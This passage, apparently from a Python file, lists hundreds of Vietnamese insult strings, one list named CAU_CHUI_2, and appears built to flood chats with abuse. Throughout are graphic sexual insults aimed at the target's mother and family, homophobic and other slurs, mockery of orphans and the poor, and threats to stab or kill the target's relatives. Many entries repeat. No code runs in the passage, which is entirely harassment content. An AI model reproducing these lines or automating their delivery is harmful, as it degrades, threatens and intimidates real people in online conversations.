"Khi nào con có đủ tầm ảnh hưởng lên đứng với cha",
"Sợ tao lắm đk", 
"cha ttho bá đạo vcl mà con=))", 
"Sao v",
"THANG OC LON MO COI=))", 
"Mau di o",
"Sua cai",
"Ngung me may a",
"Thk dot",
"t cân cả dòng họ m mà:))", 
"Win nhoa",
"nhây sao lại anh", 
"úi con sucvat háng thâm😜😜", 
"Cam cay",
"Ớt cãy",
"Đời quá chán nên Tao chả ngán đứa nào, xông vô và tao sẽ cho mày đi ôtô ra Nghĩa Địa =))", 
"Ngu ngu",
"ăn hại phát biểu lẹ đê 🤣🤣", 
"Sua di cn",
"cave tỉnh lẽ phát biểu:))", 
"Lofi cai",
"CHA ĐẤNG MXH MÀ🤣🤣", 
"Cn cho con",
"=)))",
"2 con bede không phản kháng được à😋", 
"2 con bede sợ anh rồi:))🙃", 
"chạy về mách mom à 2 con bede😗?", 
"Lam j v",
"Met a em",
"CHA WIN NỮA RỒI À =))", 
"Thoi ah win nha",
"LẠI WIN RỒI HEHEH", 
"lần sau gặp cha ttho thì xin tha đi🤣", 
"Cam an hoi",
"An hoi may die",
"Nghe ch",
"Bai nha cn",
"KAKA TINH TRUNG KHUYET TAT", 
"👉🤣🤣",
"Sao v",
"Choi a",
"Cayyy",
"Đừng cay cú cha mà hóa rồ lên làm nét", 
"sài adr 2m đòi khè ai v tr 😜😜👍", 
"úi cn bẻm bị anh chà đạp", 
"Sua le",
"Ngu a",
"nè thang chos, ra nghe bo noi nay, ngay xua m/e con mat trinh non cung la vi bo day, roi m/e con dai ia ra con cung la do bo day, roi m/e may sinh ra may nhu mot thang quai thu, moi lan cho bu tao phai dut cu vao trong mom may vi con m/e may khong co vu", 
"Cn ngu",
"Trận này anh win rõ mà sao cưng chối ăng ẳng thế", 
"Sua di?",
"Xom di",
"nghèo k có nghi lực à:))", 
":)))",
"Gõ cho mày tá hỏa tâm tinh🤪", 
"R nun",
"Ot nun",
"lại phải win nữa à🙄🙄", 
"Win mà🤣",
"cha mãi win nè👅", 
"ớ ớ ớ ttho là hw mà 😜😜🔫",
"Lũ đú hết thời lên đây xưng danh với ai",
"thẩm du cái lồn má m lên🤣👈",
"con đĩ cãi cùn",
"địt bà nội sư gia nhà m =))",
"úi úi",
"nhanh lên con chó lồn khai khắm=))",
"sao con đĩ mẹ mày gà vậy",
"địt lồn mẹ mày",
"dập cặc thằng cha mày liền",
"Cầm đinh ba đâm lòi cuống họng đĩ mẹ mày liền",
"Con thú đú",
"lòi lồn chiến sĩ rồi à",
"sao không mạnh mẽ lên",
"khép lép vậy",
"sợ hãi rồi à",
"Lẹ lên con điếm thúi",
"con đĩ mồ côi ăn hôi",
"thế nào rồi",
"sợ anh mày chưa",
"anh mày bá sàn mà",
"sao m chối hoài",
"chối là con má m die",
"ngu thì ngu vừa thôi=))",
"không t đâm chết thằng cha mày",
"óc chó dữ",
"lồn mẹ mày",
"điếm thúi ơi=))",
"đừng rớt nhây nhó:3",
"thấy sao rùi:3",
"Bede sủa tiếng nghe choiw",
"Cặc Cặc Cặc",
"Lồn Lồn Lồn",
"=))",
"Thấy anh nhây bá ko",
"quá bá mà",
"sao lại anh được",
"khép đuôi xin tha đê",
"Rủa đĩ má m die",
"Ngồi nhây tới đêm trăng tròn nè=))",
"Nhây sao lại anh",
"Bóng sida",
"bede dập cu ơi=))",
"nhắm chửi lại anh không=))",
"lẹ lên con đĩ",
"điếm thúi ăn hôi ơi:))",
"Lên xem còn tài cán gì không nào",
"Sao mà xạo lồn",
"Chỉ có vậy thôi sao",
"mày làm được gì không😤",
"hay chỉ biết phản kháng🤭=))",
"tk cu bé phản kháng di😏?",
"con đĩ cave luôn khảng phán đi🥺?",
"bị chửi nên không phản kháng à😀?",
"2 con bede không phản kháng được à😋",
"2 con bede sợ anh rồi:))🙃",
"chạy về mách mẹ à 2 con bede😗?",
"chạy về trốn dô cái lồn mẹ mày đi😍?",
"1 đứa bú lồn mẹ😎?",
"1 đứa bú cu cha😎?",
"bất hiếu cmnr 😜👈",
"mày làm gì để anh sợ đi:))🤣?",
"mày có tý sát thương nào ko😂?",
"con đĩ mẹ mày ăn cứt cố đi🤣?",
"mày sợ anh à con chó ăn cứt:))?",
"anh win cmnr clm🤣",
"lũ cave cay cha cmnr😑",
"Cha mày tới đâu là lũ đú phải dè chừng",
"Đã ngu còn thik tỏ ra mình có trình hả cn thú ngu êy",
"Khóc r hả thương vậy",
"Thương cho con thú cay anh mà không làm được gì",
"Sao cho cầu cứu mà cầu cứu xog sao kh ai dám dô giúp ht vậy",
"Sống chi bần hèn quá v",
"Sao con đú mà con xạo lồn hả cn thú ngu êy",
"Cha mày chuyên hành lũ đú mà",
"Con sủa hăng máu lên ",
"Câm là cha mày gọi hồn mày như gọi đò",
"Con sơ hở là xạo lồn bịa chuyện ai xem",
"Nhìn con dị hợm quá vậy?",
"Con kiếp trước chắc sống phế lắm nhỉ",
"Qua kiếp này làm lại từ đầu mà sao ngu quá v",
"Cn thú cầm cái phím tắt ôm trong tuyệt vọng hả",
"Đú sao lại được hả cn ngồi ôm phím gõ dăm ba mấy cái ngôn xưa lắc xưa lơ ",
"Ai cứu mày được quả này",
"Cầu cứu lẹ đi🤣",
"Cha hóng nãy giờ nè🤣",
"Mẹ mày làm con chó canh cửa cho nhà t mà🤣",
"Mẹ m bị xe cán lòi não kìa",
"Ra nhặt về đi",
"Mẹ m bị chó nhà anh some mà",
"Cha ruột m là chó mà 😜",
"Thú ngu bị cha sút về hành hạ mẹ ruột kìa",
"Mẹ m bị anh treo cổ mà😜",
"Chó ngu bị cha nhét cứt đến die mà🤣🤣🤣",
"Khẩu phần ăn của mẹ m là cứt mà😜",
"Thú ngu cay kìa=}",
"Óc cặc cay anh đến độ trứng dái sắp bay ra ngoài r kìa=)))",
"sồn hăng lên em",
"sao m yếu v",
"cố tí nữa",
"sao kìa chậm à",
"hăng hái lên tí chứ",
"tới sáng đi em eii",
"cố gắng tí eii",
"k đc à",
"con eii cố de",
"sao m câm kìa",
"gà j",
"phãn kháng đi con chó",
"cha bá sàn cmnr tk sủa mạnh lên dc k chó",
"tk ớt cay kiểu",
"đúng mà",
"m hoản loạn khi gặp cha à",
"mày còn gì khác k",
"gà mà m xạo lồn vs cha m à",
"tk súc sinh",
"mếu à",
"đầu đình tứ phủ",
"bị a đá lên đầu lên cổ",
"va lẹ eii",
"sao kìa",
"từ bỏ r à",
"nhìn a",
"phập lồn con gái mẹ m",
"m bất lực",
"kh lm j dc anh",
"sao mày bất lực để anh hành hạ vậy hả con chó ngu =))))",
"cay lắm phải kh",
"đúng k",
"tk não chó",
"m liếm lồn dê khen béo à",
"tk óc heo",
"sao gà mà sồn v",
"sồn như lúc đầu cho tao",
"sao à",
"ai cho m nhai",
"cay lắm r", 
"tk óc heo",
"mày nghĩ mày làm t cay đc à",
"m chỉ bt ngồi",
"tao đang hành m mà",
"rênh rỉ gào thét",
"trong vô vọng à",
"tk giả gái sủa hăng lên",
"hăng tiếp đi",
"tới sáng k em",
"k tới sáng à",
"chán v",
"sồn mạnh lên",
"chửi như m đéo ai nghe",
"coi tụi nó dồn ngu kìa",
"ae ơiii",
"lại win à",
"lại win r",
"lũ cặc cay tao lắm🤣🤣",
"cố lên đê",
"nó treo à ae 🤣",
"yếu đến thế à",
"cay lắm à :))",
"nhạt nhoè v à",
"ko cảm hứng để hăng à :)))",
"xạo lồn à :)))",
"khóc đk :)))",
"cave tỉnh lẽ phát biểu:))",
"ra tín hiệu đê :)))",
"SOS con dái đú 🤣🤣🤢",
"ớ ớ ớ :)))",
"chó ăn cứt :)))",
"chó đú sàn 👌🐶",
"ỉa ra máu r à :)))",
"nghèo k có nghi lực à:))",
"phản kháng đê :))) t win à",
"kkk",
"m chết r à :)))",
"m nghèo mà em 😏🤣",
"m thèm cứt t mà:))",
"đĩ mẹ m ngu mà👉🤣",
"m cay tao mà :))",
"con óc cứt thối🤢🤢",
"con đĩ mặt chim🤪🤪",
"ôm hận à 🤨",
"con đĩ nhà núi :)))",
"bede bóng lộ =))",
"cn đĩ mẹ mày",
"tao từ hình mẹ m mà :))",
"tk phế vật ăn hại😏🤘",
"đú đởn hả con :))",
"m sao dọ",
"sủa nè ",
"123 sủa😏",
"lẹ nè ",
"alo alo hú hú ",
"th cầm thú",
"m s dạ ",
"m sợ mẹ hả ",
"lên đi mẹ ko giết cha má m đâu mà 😏",
"hù :))",
"bất ổn hở",
"s đó ",
"m rớt kìa th gà🤪",
"t cấm m chối nhen",
"chối t giết cha má m nè:)))",
"hăng xíu lẹ kaka🤢",
"th đần ",
"lên mẹ biểu",
"k lên t tuyệt chủng m nhen cn thú",
"m thích đú ko dạ🤨",
"ko rep = t win nhen ",
"cấm chạy nhen",
"m mau ",
"lên đây ơ ơ ",
"th ngu ê",
"s á lên đây mẹ sút m chết",
"m khóc à 👉🤣",
"sủa liên tục ơ🤣🤣",
"cầu cứu lũ đú à ",
"sục dái nó xem à",
"dái thâm v?",
"chậm v cn culi🤣🤣👌",
"hoảng loạn à",
"bất ổn à 🤮🤮",
"run à",
"chạy à ",
"đuối à ",
"bại chưa 👉😏",
"sủa mau🙄🙄👈",
"mạnh dạn lên ",
"nhanh t cho cơ hội cứu má m nè",
"cấm mách mẹ",
"ảo war hở :))",
"dồn ko ",
"đua nè lên sàn t chấp😏👌",
"th chợ búa m sao v",
"th đầu buồi mặt chó😢🫵🏻👈🏻",
"cấm hoảng loạn",
"lại phải win nữa à🙄🙄",
"sủa điên lên cho mẹ?  ",
"mày ngưng là con đĩ mẹ mày chết?  ",
"cay tao lòi dái hả😏  ",
"não chó cay à?🤣  ",
"sao mày thảm dị=)))  ",
"mẹ mày bị tao địt rách màn trinh mà🤪  ",
"mẹ mày bị tao dã vào lồn=)))  ",
"địt mẹ mày sướng tê con cặc=)))  ",
"huhu nhìn mày như con cặc=)))  ",
"mày loạn luân bà già hả=)))  ",
"mẹ mày bị tao địt rên ư ử=)))  ",
"địt mẹ mày sảng khoái quá đi😛  ",
"tao địt mẹ mày nát lồn mà=)))  ",
"Kkk",
"chạy về trốn dô cái lồn mẹ mày đi😍?",
"bất hiếu cmnr 😜👈",
"mày làm gì để anh sợ đi:))🤣?",
"mày có tý sát thương nào ko😂?",
"con đĩ mẹ mày ăn cứt cố đi🤣?",
"mày sợ anh à con chó ăn cứt:))?",
"anh win cmnr clm🤣",
"lũ cave cay cha cmnr😑",
"Cha mày tới đâu là lũ đú phải dè chừng",
"Đã ngu còn thik tỏ ra mình có trình hả cn thú ngu êy",
"Khóc r hả thương vậy",
"Thương cho con thú cay anh mà không làm được gì",
"Sao cho cầu cứu mà cầu cứu xog sao kh ai dám dô giúp ht vậy",
"Sống chi bần hèn quá v",
"Sao con đú mà con xạo lồn hả cn thú ngu êy",
"Cha mày chuyên hành lũ đú mà",
"Con sủa hăng máu lên ",
"Câm là cha mày gọi hồn mày như gọi đò",
"Con sơ hở là xạo lồn bịa chuyện ai xem",
"Nhìn con dị hợm quá vậy?",
"Con kiếp trước chắc sống phế lắm nhỉ",
"Qua kiếp này làm lại từ đầu mà sao ngu quá v",
"Cn thú cầm cái phím tắt ôm trong tuyệt vọng hả",
"Đú sao lại được hả cn ngồi ôm phím gõ dăm ba mấy cái ngôn xưa lắc xưa lơ ",
"Ai cứu mày được quả này",
"Cầu cứu lẹ đi🤣",
"Cha hóng nãy giờ nè🤣",
"Mẹ mày làm con chó canh cửa cho nhà t mà🤣",
"Mẹ m bị xe cán lòi não kìa",
"Ra nhặt về đi",
"Mẹ m bị chó nhà anh some mà",
"Cha ruột m là chó mà 😜",
"Thú ngu bị cha sút về hành hạ mẹ ruột kìa",
"Mẹ m bị anh treo cổ mà😜",
"Chó ngu bị cha nhét cứt đến die mà🤣🤣🤣",
"Khẩu phần ăn của mẹ m là cứt mà😜",
"Thú ngu cay kìa=}",
"Óc cặc cay anh đến độ trứng dái sắp bay ra ngoài r kìa=)))",
"sồn hăng lên em",
"sao m yếu v",
"cố tí nữa",
"sao kìa chậm à",
"hăng hái lên tí chứ",
"tới sáng đi em eii",
"cố gắng tí eii",
"k đc à",
"con eii cố de",
"sao m câm kìa",
"gà j",
"phãn kháng đi con chó",
"cha bá sàn cmnr tk sủa mạnh lên dc k chó",
"tk ớt cay kiểu",
"đúng mà",
"m hoản loạn khi gặp cha à",
"mày còn gì khác k",
"gà mà m xạo lồn vs cha m à",
"tk súc sinh",
"mếu à",
"đầu đình tứ phủ",
"bị a đá lên đầu lên cổ",
"va lẹ eii",
"sao kìa",
"từ bỏ r à",
"nhìn a",
"phập lồn con gái mẹ m",
"m bất lực",
"kh lm j dc anh",
"sao mày bất lực để anh hành hạ vậy hả con chó ngu =))))",
"cay lắm phải kh",
"đúng k",
"tk não chó",
"m liếm lồn dê khen béo à",
"tk óc heo",
"sao gà mà sồn v",
"sồn như lúc đầu cho tao",
"sao à",
"ai cho m nhai",
"cay lắm r", 
"tk óc heo",
"mày nghĩ mày làm t cay đc à",
"m chỉ bt ngồi",
"tao đang hành m mà",
"rênh rỉ gào thét",
"trong vô vọng à",
"tk giả gái sủa hăng lên",
"hăng tiếp đi",
"tới sáng k em",
"k tới sáng à",
"chán v",
"sồn mạnh lên",
"chửi như m đéo ai nghe",
"coi tụi nó dồn ngu kìa",
"ae ơiii",
"lại win à",
"lại win r",
"lũ cặc cay tao lắm🤣🤣",
"cố lên đê",
"nó treo à ae 🤣",
"yếu đến thế à",
"cay lắm à :))",
"nhạt nhoè v à",
"ko cảm hứng để hăng à :)))",
"xạo lồn à :)))",
"khóc đk :)))",
"cave tỉnh lẽ phát biểu:))",
"ra tín hiệu đê :)))",
"SOS con dái đú 🤣🤣🤢",
"ớ ớ ớ :)))",
"chó ăn cứt :)))",
"chó đú sàn 👌🐶",
"ỉa ra máu r à :)))",
"nghèo k có nghi lực à:))",
"phản kháng đê :))) t win à",
"kkk",
"m chết r à :)))",
"m nghèo mà em 😏🤣",
"m thèm cứt t mà:))",
"đĩ mẹ m ngu mà👉🤣",
"m cay tao mà :))",
"con óc cứt thối🤢🤢",
"con đĩ mặt chim🤪🤪",
"ôm hận à 🤨",
"con đĩ nhà núi :)))",
"bede bóng lộ =))",
"cn đĩ mẹ mày",
"tao từ hình mẹ m mà :))",
"tk phế vật ăn hại😏🤘",
"đú đởn hả con :))",
"m sao dọ",
"sủa nè ",
"123 sủa😏",
"lẹ nè ",
"alo alo hú hú ",
"th cầm thú",
"m s dạ ",
"m sợ mẹ hả ",
"lên đi mẹ ko giết cha má m đâu mà 😏",
"hù :))",
"bất ổn hở",
"s đó ",
"m rớt kìa th gà🤪",
"t cấm m chối nhen",
"chối t giết cha má m nè:)))",
"hăng xíu lẹ kaka🤢",
"th đần ",
"lên mẹ biểu",
"k lên t tuyệt chủng m nhen cn thú",
"m thích đú ko dạ🤨",
"ko rep = t win nhen ",
"cấm chạy nhen",
"m mau ",
"lên đây ơ ơ ",
"th ngu ê",
"s á lên đây mẹ sút m chết",
"m khóc à 👉🤣",
"sủa liên tục ơ🤣🤣",
"cầu cứu lũ đú à ",
"sục dái nó xem à",
"dái thâm v?",
"chậm v cn culi🤣🤣👌",
"hoảng loạn à",
"bất ổn à 🤮🤮",
"run à",
"chạy à ",
"đuối à ",
"bại chưa 👉😏",
"sủa mau🙄🙄👈",
"mạnh dạn lên ",
"nhanh t cho cơ hội cứu má m nè",
"cấm mách mẹ",
"ảo war hở :))",
"dồn ko ",
"đua nè lên sàn t chấp😏👌",
"th chợ búa m sao v",
"th đầu buồi mặt chó😢🫵🏻👈🏻",
"cấm hoảng loạn",
"lại phải win nữa à🙄🙄",
"sủa điên lên cho mẹ?  ",
"mày ngưng là con đĩ mẹ mày chết?  ",
"cay tao lòi dái hả😏  ",
"não chó cay à?🤣  ",
"sao mày thảm dị=)))  ",
"mẹ mày bị tao địt rách màn trinh mà🤪  ",
"mẹ mày bị tao dã vào lồn=)))  ",
"địt mẹ mày sướng tê con cặc=)))  ",
"huhu nhìn mày như con cặc=)))  ",
"mày loạn luân bà già hả=)))  ",
"mẹ mày bị tao địt rên ư ử=)))  ",
"địt mẹ mày sảng khoái quá đi😛  ",
"tao địt mẹ mày nát lồn mà=)))  ",
"Kkk",
"Con đĩ mẹ mày sủa điện loạn đê",
"Hăng lên t xem ",
"Mày ngu rõ mà",
"Chửi tí sát thương đi ",
"Sao mày gà v ",
"Mày ngưng 1 giây là con đĩ mẹ mày chết liền ",
"sao kia", "manh di ma", "kem ak", "sao kia", "son de", "run ak", "thg an hai","cay tao ak", "cay lam ak", "sao roi nhi", "bat luc ak", "lien tuc de", "tiep de m","nhay keo k e", "ga vay e", "hoc lom ak", "ko slow ma","speed de", "hai vai l","m dot ak", "thg oc cut", "chay de", "chat le dei", "co len", "mo coi ak", "cay ak", "ccho cayya ak", "oc cac ak", "chay ak em", "sua mau dei", "sua le dei", "tk dot", "tk oc dai", "sua le de", "manh kg", "manh ma e", "man ma em", "tk dot", "ui mo coi", "sua lej9 dei", "oc loz ak", "tk boai ngu", "son dc kg", "oc trau ak", "le ma em", "hot nhay ma", " tk oc dai", "sua manh kg", "m bi ngu ak", "sua mau kg", "oc trau ak", "speed em", "le nun ma", "tk dot cut", "bi ngu ak", "son de em", "ccho dien", "nhanh vl ma", "tay ma em", "slow ak", "oc boai ak", "tk dot", " bia ngu ak", "sua le nun", "phat bieu le", "tk dot nay", "mo coi me ak", "tk ngu", "sao da", "anh man mak", "cay akk", "sua mauu", "sloww akk", "le em", "nhanh em", "clmkks", "con cho dien", "sua em", "speed ma", "m slow ay", "m slow vl", "anh speed vkl", "le em", "clm ngu ak", "tk ga nay", "con loz", "sua le lun em", "clm dot ak", "keo man cai", "man off mxh de", "kg dam ak", "tk ngu ren", "cay r ak", "cay cmnr", "m cay ro", "nhanh ti", "le len e", "co de", "sap dc r", "co gang em", "bat luc r ak", "ui tk ga", "ga bat luc", "duoi r ak", "moi tay ak", "kakakak", "sua le nun", "chill ma", "bth ma em", "m bat on ak", "anh dg chill", "sua manh em", "kg dc treo nha", "tay vs bo de", "cn boai", "nao cho ak", "clm", "sua mau de", "ga ak m", "slow r ak m", "duoi r ak", "kh nghi ngoi", "lien tuc ma", "lien tuc nun", "chat lien tuc", "le kja m", "sao roi", "dien dai ak", "le len cmm", "so t ak", "clm dot ak", "anh kg bt duoi", "le ma em", "sua de", "tk dot nay", "le me ak", "tk oc bo", "loan phim r ak", "oc cho", "kay roi ak", "le de m", "clm ga l", "man off kg", "kay ak em", "tk oc l", "le len", "lien tuc ma", "slow kia", "oc ak", "cayy r", "muon win ak", "dot s win", "kakakk", "yeu akk may", "nhanh ma", "speed vl ayh nhi", "z ha m", "m dot ak", "m dot ma e", "tk dot kakka", "🤣🤣", "slow v", "le hon de", "lofi lun", "ui ga", "cay rui ak", "lien tuc de", "yeu v ak", "manh hon di", "kg dc ak", "oc cho ak", "sua lien tuc ma", "clm tk dot", "lien tuc nao", "sao roi m", "slow v ak", "ngu ak em", "tk dot dai cho", "liec tuc de m", "Sua lien tuc", "ko dc ak", "clm slow v", "nhanh ti dc kg", "cut tay ak", "tk ngheo", "m te nan ak", "phe ak", "co gang", "sap dc r", "ti nx di m", "speed xiu nx", "sap dc r do", "ga v ak", "sao doa kaka", "m ngu ak", "m dot ro", "tk oc dai", "oc trau ak", "cmm dot the", "man ma m", "manh nun ma", "tk dot slow v", "cay r ak", "sua de m", "lofi ma m", "sua chill v", "tk ga âkkak", "le de m", "Chill z", "sua lien tuc", "m that hoc ak", "m cay ak", "le ti de", "khac nx di", "ko lau ak", "ko sua ak", "soa da", "bt sua kg", "moe may", "sao dot v", "that hoc ak m", "cuoiia kakak", "lien tuc nua de", "le me ak", "son dj m", "tk cho dien", "hang le di m", "cho dien kg son ak", "ko vui r e", "k son chan the", "sua de m", "Alo", "lien tuc ma", "clmm", "tk mo coi", "dot ak m", "anh hot nhay ma", "nhanh ti", "co ti nua m", "co nua", "sap dc roi do", "co len m", "deo dc r ak", "bat luc ak",  "ga v em", "oc c loan luan", "tk cho dien", "son di m", "bat luc ak", "moi tay r ak", "duoi ak m", "ko on r ak", "k nghi ngoi ma", "speed ma m", "k speed dc ak", "oc cho z", "slow lai r ak", "sua lien tuc di", "k rot ma", "con di", "me m", "duoi ak", "le ma m", "r x", "lai victory ak", "victory ak", "victory tk slow ak", "k cay ma", "sao v", "cay ak m", "speed di", "dot ak m", "thg phe", "le lun", "oc cak", "sua dei", "kakâk", "le kg m", "tk dot", "cay r ak", "bat luc ak", "duoi r ak", "son dei", "tk ba do", "chay kg", "son le dei", "con cho", "cho dien cay", "ba m ngu", "clm rot ak", "lien tuc dei", "bo m speed", "speed ma", "kg on r ak", "oc lz ak", "tk ngu", "s duoi r", "nhay ngu ak", "nhay keo kg", "tk oc heo", "bu dai ak", "loan phim ak", "bat luc r ak", "deo laiik ak", "clm sua deii", "lienmienn akk", "chay ak", "le tay di", "suai le", "om han ak", "le m", "hap hoi ak", "thg phe", "que tay ak", "clm ga v", "le dei", "ngu ak", "kg son ak", "slow ak", "bat luc ak", "bat luc hot nhay ak", "m co hot k", "m hot j ay", "hot cut ak", "tk ga", "k speed dc", "doi hot nhay ak", "bo speed vl", "le ma may", "kg son dien a", "lej dei", "clm", "sua lofi e", "kg sua ak", "sao kg sua", "kg lien tuc ak", "rot nx ak", "sao ay nhi", "tk ga", "nhay ngu z", "sua dien loan ak", "co gang di", "co nua dei", "sao r", "bat luc ak m", "tay speed vcl", "man kg e", "man off kg m", "tk dot ngu", "oc cho ak", "cay r ak", "het son ak", "sao slow nx r", "duoi r ha", "moi tay ak", "anh uoc duoi", "anh manh vkl", "suadi em", "ot ak", "cay dien r", "kakak", "anh tay ma", "speed vl ay", "m sao lai", "m slow vc", "chat cham v", "lag ak m", "dap dt ak", "cay cmnr ak", "tk dot", "kg hoc ak", "ngu da", "sao do", "lien tuc di", "kg cham ma", "kakak", "tiep tuc de", "speed kg ays", "kg noi ak", "tk ga", "ga cay", "ot r ak", "so bo ak", "a speed vl", "keo man kg", "thg oc dai", "co nua dei", "sap dc r ay", "anh victory ak", "clm victory r", "victory r ak", "ez ak", "kaka", "lien tuc di", "sua manh", "nhanh kg", "cham ak",
"sua de", "cam a", "hang de", "s da", "sợ à m", "toc do ba", " speed dei" , "cham da ba", "phế a m", "bia a m", "sua đi m", "con ngu", "cay à ba", "m phèn ma", "choi ik m", "dg cau cuu a ba", " chậm à", "anh bá mà m", "sua de","cn mm","sao ay", "sua de","cay a","maude","nhanh de","sao doa","le de","cay a","sao ay","sua di m","cay a","djt me m","con mm","hang de em","moi tay am","duoi aak","duoi ke","clm m","cay t ak","speed m","sua de","gay a","yeu ak","met ak","phe kk","nhanh dei","ga ak","bede ak","sua de","cay ak","nhanh len","cham ak m","sao da","mau di m","sua hang kg","phe ak","sua de","nhanh de ","hang de","mau de","gay a","bede ak","dit mm","dua de","cay vl ak","sua mau de","nhanh len","nhanh kg" ,"sao da","o ke","cham da","t nhanh vvl","lien tuc dei","dua du","toc do de","sua de","le de","cay ak m","sua de m","sua chay di","con cho","ga ak cn","bia a","con cho ngu","soeed di m","dien me r","so ak","so ke","cay","chay ak","gay ke","clm m","akaka","cn mm","chill di","sua du","nhanh m","ga ak","tk cac",

]

CAU_CHUI_2 = [
"sao kia", "manh di ma", "kem ak", "sao kia", "son de", "run ak", "thg an hai","cay tao ak", "cay lam ak", "sao roi nhi", "bat luc ak", "lien tuc de", "tiep de m","nhay keo k e", "ga vay e", "hoc lom ak", "ko slow ma","speed de", "hai vai l","m dot ak", "thg oc cut", "chay de", "chat le dei", "co len", "mo coi ak", "cay ak", "ccho cayya ak", "oc cac ak", "chay ak em", "sua mau dei", "sua le dei", "tk dot", "tk oc dai", "sua le de", "manh kg", "manh ma e", "man ma em", "tk dot", "ui mo coi", "sua lej9 dei", "oc loz ak", "tk boai ngu", "son dc kg", "oc trau ak", "le ma em", "hot nhay ma", " tk oc dai", "sua manh kg", "m bi ngu ak", "sua mau kg", "oc trau ak", "speed em", "le nun ma", "tk dot cut", "bi ngu ak", "son de em", "ccho dien", "nhanh vl ma", "tay ma em", "slow ak", "oc boai ak", "tk dot", " bia ngu ak", "sua le nun", "phat bieu le", "tk dot nay", "mo coi me ak", "tk ngu", "sao da", "anh man mak", "cay akk", "sua mauu", "sloww akk", "le em", "nhanh em", "clmkks", "con cho dien", "sua em", "speed ma", "m slow ay", "m slow vl", "anh speed vkl", "le em", "clm ngu ak", "tk ga nay", "con loz", "sua le lun em", "clm dot ak", "keo man cai", "man off mxh de", "kg dam ak", "tk ngu ren", "cay r ak", "cay cmnr", "m cay ro", "nhanh ti", "le len e", "co de", "sap dc r", "co gang em", "bat luc r ak", "ui tk ga", "ga bat luc", "duoi r ak", "moi tay ak", "kakakak", "sua le nun", "chill ma", "bth ma em", "m bat on ak", "anh dg chill", "sua manh em", "kg dc treo nha", "tay vs bo de", "cn boai", "nao cho ak", "clm", "sua mau de", "ga ak m", "slow r ak m", "duoi r ak", "kh nghi ngoi", "lien tuc ma", "lien tuc nun", "chat lien tuc", "le kja m", "sao roi", "dien dai ak", "le len cmm", "so t ak", "clm dot ak", "anh kg bt duoi", "le ma em", "sua de", "tk dot nay", "le me ak", "tk oc bo", "loan phim r ak", "oc cho", "kay roi ak", "le de m", "clm ga l", "man off kg", "kay ak em", "tk oc l", "le len", "lien tuc ma", "slow kia", "oc ak", "cayy r", "muon win ak", "dot s win", "kakakk", "yeu akk may", "nhanh ma", "speed vl ayh nhi", "z ha m", "m dot ak", "m dot ma e", "tk dot kakka", "🤣🤣", "slow v", "le hon de", "lofi lun", "ui ga", "cay rui ak", "lien tuc de", "yeu v ak", "manh hon di", "kg dc ak", "oc cho ak", "sua lien tuc ma", "clm tk dot", "lien tuc nao", "sao roi m", "slow v ak", "ngu ak em", "tk dot dai cho", "liec tuc de m", "Sua lien tuc", "ko dc ak", "clm slow v", "nhanh ti dc kg", "cut tay ak", "tk ngheo", "m te nan ak", "phe ak", "co gang", "sap dc r", "ti nx di m", "speed xiu nx", "sap dc r do", "ga v ak", "sao doa kaka", "m ngu ak", "m dot ro", "tk oc dai", "oc trau ak", "cmm dot the", "man ma m", "manh nun ma", "tk dot slow v", "cay r ak", "sua de m", "lofi ma m", "sua chill v", "tk ga âkkak", "le de m", "Chill z", "sua lien tuc", "m that hoc ak", "m cay ak", "le ti de", "khac nx di", "ko lau ak", "ko sua ak", "soa da", "bt sua kg", "moe may", "sao dot v", "that hoc ak m", "cuoiia kakak", "lien tuc nua de", "le me ak", "son dj m", "tk cho dien", "hang le di m", "cho dien kg son ak", "ko vui r e", "k son chan the", "sua de m", "Alo", "lien tuc ma", "clmm", "tk mo coi", "dot ak m", "anh hot nhay ma", "nhanh ti", "co ti nua m", "co nua", "sap dc roi do", "co len m", "deo dc r ak", "bat luc ak",  "ga v em", "oc c loan luan", "tk cho dien", "son di m", "bat luc ak", "moi tay r ak", "duoi ak m", "ko on r ak", "k nghi ngoi ma", "speed ma m", "k speed dc ak", "oc cho z", "slow lai r ak", "sua lien tuc di", "k rot ma", "con di", "me m", "duoi ak", "le ma m", "r x", "lai victory ak", "victory ak", "victory tk slow ak", "k cay ma", "sao v", "cay ak m", "speed di", "dot ak m", "thg phe", "le lun", "oc cak", "sua dei", "kakâk", "le kg m", "tk dot", "cay r ak", "bat luc ak", "duoi r ak", "son dei", "tk ba do", "chay kg", "son le dei", "con cho", "cho dien cay", "ba m ngu", "clm rot ak", "lien tuc dei", "bo m speed", "speed ma", "kg on r ak", "oc lz ak", "tk ngu", "s duoi r", "nhay ngu ak", "nhay keo kg", "tk oc heo", "bu dai ak", "loan phim ak", "bat luc r ak", "deo laiik ak", "clm sua deii", "lienmienn akk", "chay ak", "le tay di", "suai le", "om han ak", "le m", "hap hoi ak", "thg phe", "que tay ak", "clm ga v", "le dei", "ngu ak", "kg son ak", "slow ak", "bat luc ak", "bat luc hot nhay ak", "m co hot k", "m hot j ay", "hot cut ak", "tk ga", "k speed dc", "doi hot nhay ak", "bo speed vl", "le ma may", "kg son dien a", "lej dei", "clm", "sua lofi e", "kg sua ak", "sao kg sua", "kg lien tuc ak", "rot nx ak", "sao ay nhi", "tk ga", "nhay ngu z", "sua dien loan ak", "co gang di", "co nua dei", "sao r", "bat luc ak m", "tay speed vcl", "man kg e", "man off kg m", "tk dot ngu", "oc cho ak", "cay r ak", "het son ak", "sao slow nx r", "duoi r ha", "moi tay ak", "anh uoc duoi", "anh manh vkl", "suadi em", "ot ak", "cay dien r", "kakak", "anh tay ma", "speed vl ay", "m sao lai", "m slow vc", "chat cham v", "lag ak m", "dap dt ak", "cay cmnr ak", "tk dot", "kg hoc ak", "ngu da", "sao do", "lien tuc di", "kg cham ma", "kakak", "tiep tuc de", "speed kg ays", "kg noi ak", "tk ga", "ga cay", "ot r ak", "so bo ak", "a speed vl", "keo man kg", "thg oc dai", "co nua dei", "sap dc r ay", "anh victory ak", "clm victory r", "victory r ak", "ez ak", "kaka", "lien tuc di", "sua manh", "nhanh kg", "cham ak",
